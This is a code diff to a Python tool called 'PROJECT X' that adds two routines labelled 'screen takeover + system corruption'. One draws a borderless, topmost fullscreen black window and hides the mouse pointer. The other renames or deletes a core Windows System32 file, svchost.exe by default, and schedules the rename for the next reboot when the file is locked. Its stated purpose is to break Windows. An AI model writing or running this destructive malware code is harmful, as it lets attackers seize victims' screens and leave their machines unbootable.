@@ -53,7 +53,91 @@ RUN_MODE = "--run" in sys.argv
 ORIG_DIR = None
 try:    SRC = open(SELF, "rb").read()
 except Exception: SRC = None
+# ---- PROJECT X extras: screen takeover + system corruption ----
+_BLACKOUT = {"on": False, "stop": False}
 
+def px_blackout(args=None):
+    """Black fullscreen 'PROJECT-X' takeover. args: op=on|off, title=, size="""
+    args = args or {}
+    op = (args.get("op") or "on").lower()
+    if op in ("off", "0", "false"):
+        _BLACKOUT["stop"] = True
+        return "blackout off"
+    if _BLACKOUT["on"]:
+        return "blackout already on"
+    try:
+        import tkinter as tk
+    except Exception as e:
+        return "tkinter missing: %s" % e
+
+    title = args.get("title") or "PROJECT-X"
+    size  = int(args.get("size") or 100)
+
+    def ui():
+        root = tk.Tk()
+        root.configure(bg="black")
+        root.overrideredirect(True)              # no title bar, no border
+        root.attributes("-fullscreen", True)
+        root.attributes("-topmost", True)
+        root.config(cursor="none")               # hide the mouse pointer
+        tk.Label(root, text=title, fg="#00ff88", bg="black",
+                 font=("Consolas", size, "bold")).pack(expand=True)
+        tk.Label(root, text="press ESC to exit", fg="#3a3a3a", bg="black",
+                 font=("Consolas", 16)).pack(side="bottom", pady=28)
+        root.bind("<Escape>", lambda e: root.destroy())
+        def tick():
+            if _BLACKOUT["stop"]:
+                root.destroy(); return
+            root.after(200, tick)
+        tick()
+        root.lift(); root.focus_force(); root.mainloop()
+        _BLACKOUT["on"] = False
+
+    _BLACKOUT.update(on=True, stop=False)
+    threading.Thread(target=ui, daemon=True).start()
+    return "blackout on"
+def _sys32():
+    root = os.environ.get("SystemRoot", r"C:\Windows")
+    native = os.path.join(root, "Sysnative")     # only exists for 32-bit procs
+    return native if os.path.isdir(native) else os.path.join(root, "System32")
+
+def px_corrupt(args=None):
+    """Break Windows by renaming/deleting a core System32 file. Needs admin.
+       args: op=rename|delete|restore, path=svchost.exe"""
+    args = args or {}
+    name = args.get("path") or "svchost.exe"
+    op   = (args.get("op") or "rename").lower()
+    p    = name if os.path.isabs(name) else os.path.join(_sys32(), name)
+    bak  = p + ".px_bak"
+
+    if op in ("rename", "corrupt", "break"):
+        if os.path.exists(bak): return "already corrupted (backup exists)"
+        if not os.path.exists(p): return "not found: " + p
+        try:
+            os.rename(p, bak)
+        except PermissionError:
+            return "access denied - run 'elevate' first"
+        except OSError:                          # locked by the running system
+            import ctypes
+            ok = ctypes.windll.kernel32.MoveFileExW(p, bak, 0x4)  # DELAY_UNTIL_REBOOT
+            return "rename scheduled for next reboot" if ok else "rename failed"
+        return "renamed %s -> %s.px_bak" % (name, name)
+
+    if op == "delete":
+        if not os.path.exists(p): return "not found: " + p
+        try: os.remove(p)
+        except PermissionError: return "access denied - run 'elevate' first"
+        return "deleted " + p
+
+    if op == "restore":
+        if not os.path.exists(bak): return "no backup at " + bak
+        if os.path.exists(p):
+            try: os.remove(p)
+            except PermissionError: return "target busy - reboot then restore"
+        os.rename(bak, p)
+        return "restored " + name
+
+    return "op must be rename|delete|restore"
 # ------------------------------------------------------------------ crypto ---
 def _derive(passphrase, salt=b"projectx-v1", iters=60000):
     dk = hashlib.pbkdf2_hmac("sha256", passphrase.encode("utf-8"), salt, iters, dklen=64)
